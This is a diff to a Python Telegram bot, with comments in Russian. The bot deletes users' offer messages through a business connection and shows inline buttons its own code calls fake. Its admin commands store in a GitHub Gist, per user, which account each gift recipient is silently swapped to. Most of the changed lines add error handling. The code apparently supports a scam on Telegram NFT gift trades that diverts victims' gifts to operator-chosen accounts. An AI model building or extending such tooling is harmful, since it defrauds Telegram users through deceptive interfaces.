@@ -10,11 +10,18 @@ from aiogram.filters import CommandStart, Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.exceptions import TelegramBadRequest
 
+# --- НАСТРОЙКИ ИЗ СЕКРЕТОВ GITHUB ---
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 GIST_ID = os.getenv("GIST_ID")
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
 
+# Безопасное получение ADMIN_ID
+try:
+    ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
+except ValueError:
+    ADMIN_ID = 0
+
+# Стандартный получатель (если для пользователя не задан кастомный)
 DEFAULT_TARGET = "Gifts_Replayer"
 
 bot = Bot(token=BOT_TOKEN)
@@ -63,15 +70,24 @@ def get_pretty_name(slug):
 
 # --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
 async def get_gist_data():
+    if not GIST_ID or not GITHUB_TOKEN:
+        return None, "Ошибка: GIST_ID или GITHUB_TOKEN не заданы в Secrets!"
+    
     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
     url = f"https://api.github.com/gists/{GIST_ID}"
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url, headers=headers) as resp:
-            if resp.status == 200:
-                data = await resp.json()
-                content = data['files']['config.json']['content']
-                return json.loads(content) if content else {}
-    return {}
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, headers=headers) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    content = data['files'].get('config.json', {}).get('content', '{}')
+                    return json.loads(content) if content else {}, None
+                else:
+                    error_text = await resp.text()
+                    return None, f"GitHub вернул ошибку {resp.status}: {error_text}"
+    except Exception as e:
+        return None, f"Ошибка сети: {e}"
 
 async def update_gist_data(new_data: dict):
     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
@@ -83,32 +99,42 @@ async def update_gist_data(new_data: dict):
             }
         }
     }
-    async with aiohttp.ClientSession() as session:
-        async with session.patch(url, headers=headers, json=payload) as resp:
-            return resp.status == 200
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.patch(url, headers=headers, json=payload) as resp:
+                if resp.status == 200:
+                    return True, "Успех"
+                else:
+                    error_text = await resp.text()
+                    return False, f"Ошибка {resp.status}: {error_text}"
+    except Exception as e:
+        return False, f"Ошибка сети: {e}"
 
-# --- АДМИН ПАНЕЛЬ (РАБОТА ПО ЮЗЕРНЕЙМУ) ---
+# --- АДМИН ПАНЕЛЬ ---
 @dp.message(Command("set_target"))
 async def cmd_set_target(message: types.Message):
+    # Проверка на админа (если ID не совпадает - выходим)
     if message.from_user.id != ADMIN_ID:
         return
     
     parts = message.text.split()
     if len(parts) != 3:
-        await message.answer("❌ Формат: `/set_target @юзернейм новый_получатель`\nПример: `/set_target @shame1337 Nagve`")
-        return
+        return await message.answer("❌ Формат: `/set_target @юзернейм новый_получатель`")
     
-    # Очищаем от @ и приводим к нижнему регистру для надежности
     user_key = parts[1].replace("@", "").lower()
     new_target = parts[2].replace("@", "")
     
-    data = await get_gist_data()
+    data, error = await get_gist_data()
+    if error:
+        return await message.answer(f"❌ Ошибка чтения базы:\n<code>{error}</code>", parse_mode="HTML")
+    
     data[user_key] = new_target
     
-    if await update_gist_data(data):
-        await message.answer(f"✅ Для пользователя `@{user_key}` установлен новый получатель: `@{new_target}`")
+    success, error_msg = await update_gist_data(data)
+    if success:
+        await message.answer(f"✅ Для `@{user_key}` установлен новый получатель: `@{new_target}`")
     else:
-        await message.answer("❌ Ошибка сохранения в GitHub Gist.")
+        await message.answer(f"❌ Ошибка сохранения:\n<code>{error_msg}</code>", parse_mode="HTML")
 
 @dp.message(Command("remove_target"))
 async def cmd_remove_target(message: types.Message):
@@ -117,18 +143,33 @@ async def cmd_remove_target(message: types.Message):
     
     parts = message.text.split()
     if len(parts) != 2:
-        await message.answer("❌ Формат: `/remove_target @юзернейм`")
-        return
+        return await message.answer("❌ Формат: `/remove_target @юзернейм`")
     
     user_key = parts[1].replace("@", "").lower()
-    data = await get_gist_data()
+    data, error = await get_gist_data()
+    if error:
+        return await message.answer(f"❌ Ошибка чтения:\n<code>{error}</code>", parse_mode="HTML")
     
     if user_key in data:
         del data[user_key]
         if await update_gist_data(data):
-            await message.answer(f"✅ Для `@{user_key}` сброшен на стандартный @{DEFAULT_TARGET}")
+            await message.answer(f"✅ Для `@{user_key}` сброшен на @{DEFAULT_TARGET}")
+        else:
+            await message.answer("❌ Ошибка сохранения.")
     else:
         await message.answer("❌ Пользователь не найден в базе.")
+
+@dp.message(Command("test_db"))
+async def cmd_test_db(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    data, error = await get_gist_data()
+    if error:
+        return await message.answer(f"❌ Ошибка чтения:\n<code>{error}</code>", parse_mode="HTML")
+    
+    pretty_json = json.dumps(data, indent=2, ensure_ascii=False)
+    await message.answer(f"<b>База данных (Gist):</b>\n<pre><code>{pretty_json}</code></pre>", parse_mode="HTML")
 
 # --- ОСНОВНЫЕ КОМАНДЫ ---
 @dp.message(CommandStart())
@@ -190,12 +231,13 @@ async def handle_offer_command(message: types.Message):
         target_username=DEFAULT_TARGET
     )
 
-    # Берем юзернейм автора оффера для базы данных
+    # Берем ник отправителя для базы данных
     sender_username = message.from_user.username.lower() if message.from_user.username else "no_username"
 
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
         
+        # Передаем username в callback_data
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}"),
             InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}")
@@ -212,7 +254,7 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША И БАЗОЙ ДАННЫХ ---
+# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -222,10 +264,13 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
-    # Получаем кастомный юзернейм для этого пользователя из Gist по его username
-    data = await get_gist_data()
-    target_username = data.get(sender_username, DEFAULT_TARGET)
+    # Получаем кастомный юзернейм из Gist
+    data, error = await get_gist_data()
+    target_username = DEFAULT_TARGET
+    if data and not error:
+        target_username = data.get(sender_username, DEFAULT_TARGET)
 
+    # Cache-buster для обновления анимации на телефоне
     cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
     
